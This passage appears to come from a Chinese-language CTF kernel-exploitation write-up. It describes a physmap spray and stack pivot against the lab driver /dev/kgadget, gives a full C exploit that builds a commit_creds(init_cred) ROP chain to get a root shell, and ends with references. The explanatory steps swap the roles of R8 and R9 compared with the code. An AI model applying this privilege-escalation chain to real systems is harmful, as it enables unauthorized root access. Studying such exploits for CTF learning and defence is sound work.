1. R8、R9 布置好栈迁移的链子，即 `R8 = &(pop rsp ; ret)`，`R9 = 0xffff888000000000 + SPRAY_NUM * PAGE_SIZE * 2`；
2. 喷射的 payload 中，必然要包含大量 `add rsp 0xC0 ; ret` 的 gadget，其中 0xC0 来源于调试找到栈上 `pt_regs` 中 R8 的偏移；
3. 光栈迁移还不够，最后还是要写提权的 ROP 链；
4. 但是若命中了 `add rsp 0xC0 ; ret`，也不能确保最终控制流会落在提权 ROP 的开始处，就需要往里面塞 0xC0 字节的 `ret` 来确保利用稳定。

于是就构造出如下 payload：

```c
// author: @eastXueLian
// usage : eval $buildPhase
// You can refer to my nix configuration for detailed information.

#include "libLian.h"
#define SPRAY_NUM 0x4000
#define PAGE_SIZE 0x1000

extern size_t user_cs, user_ss, user_rflags, user_sp;

int fd;
size_t *physmap_spray_arr[SPRAY_NUM];
size_t add_rsp_0xc0 = 0xffffffff810737fe;
size_t pop_rsp_ret = 0xffffffff811483d0;
size_t pop_rdi_ret = 0xffffffff8108c6f0;
size_t init_cred = 0xffffffff82a6b700;
size_t commit_creds = 0xffffffff810c92e0;
size_t swapgs_pop_ret = 0xffffffff81bb99af;
size_t iretq = 0xffffffff81c01067;

size_t try_hit = 0xffff888000000000 + SPRAY_NUM * PAGE_SIZE * 2;

void segfault_handler(int sig) {
    success("Returning root shell:");
    get_shell();
    exit(0);
}

int main() {
    save_status();
    signal(SIGSEGV, segfault_handler);
    int i;

    fd = open("/dev/kgadget", 2);

    physmap_spray_arr[0] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    for (i = 0; i < (PAGE_SIZE / sizeof(size_t)) - (0xc0 / sizeof(size_t)) - 11;
         i++) {
        physmap_spray_arr[0][i] = add_rsp_0xc0;
    }
    for (int j = 0; j < 0xc0 / sizeof(size_t); j++) {
        physmap_spray_arr[0][i++] = pop_rdi_ret + 1;
    }

    physmap_spray_arr[0][i++] = pop_rdi_ret;
    physmap_spray_arr[0][i++] = init_cred;
    physmap_spray_arr[0][i++] = commit_creds;
    physmap_spray_arr[0][i++] = swapgs_pop_ret;
    physmap_spray_arr[0][i++] = 0;
    physmap_spray_arr[0][i++] = iretq;
    physmap_spray_arr[0][i++] = (size_t)get_shell;
    physmap_spray_arr[0][i++] = user_cs;
    physmap_spray_arr[0][i++] = user_rflags;
    physmap_spray_arr[0][i++] = user_sp;
    physmap_spray_arr[0][i++] = user_ss;

    for (int i = 1; i < SPRAY_NUM; i++) {
        physmap_spray_arr[i] = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        memcpy(physmap_spray_arr[i], physmap_spray_arr[0], PAGE_SIZE);
    }

    __asm__("mov r9, pop_rsp_ret;"
            "mov r8, try_hit;");

    ioctl(fd, 114514, try_hit);
    return 0;
}
```

---

# References

1. [PWN.0x00 Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/) . *[arttnba3](https://arttnba3.cn/)*
2. [系列 - Digging Into Kernel](https://blog.wingszeng.top/series/digging-into-kernel/) . *[wings](https://blog.wingszeng.top/)*
3. [index : kernel/git/torvalds/linux.git](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14) . *Linux*
